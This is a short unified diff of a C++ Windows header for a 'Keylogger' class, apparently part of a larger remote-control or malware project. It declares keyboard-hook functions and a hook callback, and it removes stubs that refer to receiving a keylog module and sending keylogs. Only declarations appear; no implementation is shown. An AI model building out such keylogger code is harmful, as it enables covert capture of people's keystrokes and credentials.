@@ -1,20 +1,17 @@
 #pragma once
 #define WIN32_LEAN_AND_MEAN
-#include <Windows.h>
 #include "core.h"
+#include <Windows.h>
+#include <string>
+using namespace std;
 
-typedef VOID(*SetHook)();
-typedef VOID(*RemoveHook)();
+void SetKeyBoardHook();
+void RemoveKeyBoardHook();
+void keylog_loop();
+LRESULT CALLBACK KeyBoardHookCallBack(int code, WPARAM wParam, LPARAM lParam);
 
 class Keylogger : public virtual Core
 {
-	HMODULE keylog_dll;
-	static SetHook SetKeyBoardHook;
-	RemoveHook RemoveKeyBoardHook;
-	static void keylog_loop();
-//	bool is_keylog_module_present(); 
-//	void recieve_keylog_module(); 
-//  send_keylogs();
 public:
 	Keylogger();
 	~Keylogger();
